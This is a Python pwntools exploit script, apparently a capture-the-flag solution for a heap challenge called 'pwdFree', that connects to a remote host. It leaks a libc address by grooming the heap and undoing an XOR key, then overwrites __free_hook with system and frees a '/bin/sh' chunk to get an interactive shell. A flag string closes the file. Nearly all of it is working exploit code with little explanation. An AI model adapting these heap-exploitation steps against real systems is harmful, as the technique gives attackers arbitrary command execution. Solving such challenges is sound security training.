from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('pwdFree')
io = remote('47.104.71.220', 38562)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
libc = ELF('libc.so.6')
elf = ELF('pwdFree')


def add(name, size, pwd, first = False):
    io.sendlineafter('Input Your Choice:\n', '1')
    io.sendlineafter('Input The ID You Want Save:', name)
    io.sendlineafter('Length Of Your Pwd:', str(size))
    io.sendafter('Your Pwd:', pwd)
    if first:
        io.recvuntil('First Add Done.Thx 4 Use. Save ID:')
        return io.recvn(8)


def edit(index, pwd):
    io.sendlineafter('Input Your Choice:\n', '2')
    io.sendline(str(index))
    io.send(pwd)


def show(index):
    io.sendlineafter('Input Your Choice:\n', '3')
    io.sendlineafter('Which PwdBox You Want Check:\n', str(index))


def delete(index):
    io.sendlineafter('Input Your Choice:\n', '4')
    io.sendlineafter('Idx you want 2 Delete:', str(index))


def leak():
    global random_num, libc_base
    random_num = u64(add('pwd0', 0x8, p64(0), True))                    # index0
    log.success('random_num: ' + hex(random_num))
    for i in range(1, 8):
        add('pwd' + str(i), 0x100, cyclic(0x100))                       # index1 - index7
    for i in range(8, 15):
        add('pwd' + str(i), 0x88, cyclic(0x86) + b'\n')                 # index8 - index14
    for i in range(15, 22):
        add('pwd' + str(i), 0x98, cyclic(0x96) + b'\n')                 # index15 - index21
    add('pwd22', 0x18, cyclic(0x16) + b'\n')                            # index22
    add('pwd23', 0x100, cyclic(0xf0) + p64(0x100 ^ random_num) + b'\n') # index23
    add('pwd24', 0x88, cyclic(0x86) + b'\n')                            # index24
    add('pwd25', 0x18, cyclic(0x16) + b'\n')                            # index25
    for i in range(1, 15):
        delete(i)
    delete(23)
    delete(22)
    add('pwd22', 0x18, cyclic(0x18))                                    # index1
    add('pwd23', 0x98, cyclic(0x96) + b'\n')                            # index2
    add('pwd23', 0x58, cyclic(0x56) + b'\n')                            # index3
    for i in range(15, 22):
        delete(i)
    delete(2)
    delete(24)
    for i in range(21, 14, -1):
        add('pwd' + str(i), 0x98, cyclic(0x96) + b'\n')                 # index2, index4 - index9
    add('pwd23', 0x98, cyclic(0x96) + b'\n')                            # index10
    show(3)
    io.recvuntil('\nPwd is: ')
    libc_base = (u64(io.recvn(8)) ^ random_num) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add('pwd23', 0x58, cyclic(0x56) + b'\n')                            # index11
    delete(11)
    edit(3, p64(__free_hook - 8))
    sleep(1)
    add('pwd23', 0x58, cyclic(0x56) + b'\n')                            # index11
    # '/bin/sh\x00' = 0x0068732f6e69622f
    payload = p64(0x0068732f6e69622f ^ random_num) + p64(system ^ random_num) + b'\n'
    add('fake_chunk', 0x58, payload)                                    # index12
    delete(12)
    io.interactive()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    leak()
    pwn()
# flag{2db0e64f-afe1-44d4-9af9-ae138da7bb4b}
